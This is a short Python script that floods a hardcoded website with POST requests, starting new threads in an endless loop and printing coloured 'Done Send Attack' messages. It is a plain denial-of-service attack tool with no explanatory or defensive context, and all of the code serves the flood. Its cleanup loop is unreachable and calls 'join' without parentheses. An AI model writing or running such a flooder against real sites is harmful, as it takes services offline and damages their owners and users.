import requests
import threading

def Attack():
	try:
		req = requests.post("http://random-pro.xyz/").status_code
		req = str(req)
		if "200" in req:
			print ("\033[32m[*] Done Send Attack, %s"%req)
		else:
			print ("\033[31m[*] Fail Connected By website")
	except:
		print ("\033[31m[*] Donot Found Website")
		
thread = []
while True:
 thread1 =threading.Thread(target=Attack)
 thread1.start()
 thread.append(thread1)
for thread2 in thread:
 thread2.join
